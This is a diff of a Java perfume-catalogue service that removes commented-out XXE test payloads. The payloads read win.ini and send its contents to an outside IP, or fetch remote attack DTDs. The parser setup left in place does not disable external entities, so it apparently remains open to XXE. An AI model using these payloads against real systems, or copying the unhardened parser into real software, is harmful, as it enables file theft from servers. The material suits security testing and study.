@@ -131,42 +131,6 @@ public class PerfumeServiceImpl implements PerfumeService {
         List<Perfume> perfumeList = new ArrayList<>();
 
         try {
-//            String test = "<?xml version=\"1.0\" ?>\n" +
-//                    "<!DOCTYPE r [\n" +
-//                    "<!ELEMENT r ANY >\n" +
-//                    "<!ENTITY sp SYSTEM \"http://172.21.118.79:8000\">\n" +
-//                    "]>\n" +
-//                    "<r>&sp;</r>";
-
-//            String test = "<!ENTITY % perfume SYSTEM \"file:///c:/windows/win.ini\">\n" +
-//                    "<!ENTITY % perfumers \"<!ENTITY genders SYSTEM 'http://172.21.118.79:8000/?%perfume;'>\">";
-
-//            String test = "<?xml version=\"1.0\"?>\n" +
-//                    "<!DOCTYPE r [\n" +
-//                    "<!ENTITY % data3 SYSTEM \"file:///c:/windows/win.ini\">\n" +
-//                    "<!ENTITY % sp SYSTEM \"http://172.21.118.79:8000/attack.dtd\">\n" +
-//                    "%sp;\n" +
-//                    "%param3;\n" +
-//                    "%exfil;\n" +
-//                    "]>\n" +
-//                    "<r></r>";
-//            String test = "<?xml version=\"1.0\" encoding=\"UTF-8\" ?>\n" +
-//                    "<!DOCTYPE foo SYSTEM \"http://172.21.118.79:8000/xxe.dtd\" >\n" +
-//                    "<perfume>\n" +
-//                    "    <perfumers>&tmp;</perfumers>\n" +
-//                    "    <genders></genders>\n" +
-//                    "    <prices></prices>\n" +
-//                    "</perfume>";
-
-//            String test = "<?xml version=\"1.0\"?>\n" +
-//                    "<!DOCTYPE perfume [\n" +
-//                    "<!ENTITY % xxe SYSTEM \"http://172.21.118.79:8000/attack.dtd\">\n" +
-//                    "%xxe;\n" +
-//                    "%error;\n" +
-//                    "]>\n" +
-//                    "<perfume><perfumers>Burberry</perfumers><genders></genders><prices></prices></perfume>";
-
-
             DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
             factory.isIgnoringElementContentWhitespace();
             DocumentBuilder builder = factory.newDocumentBuilder();
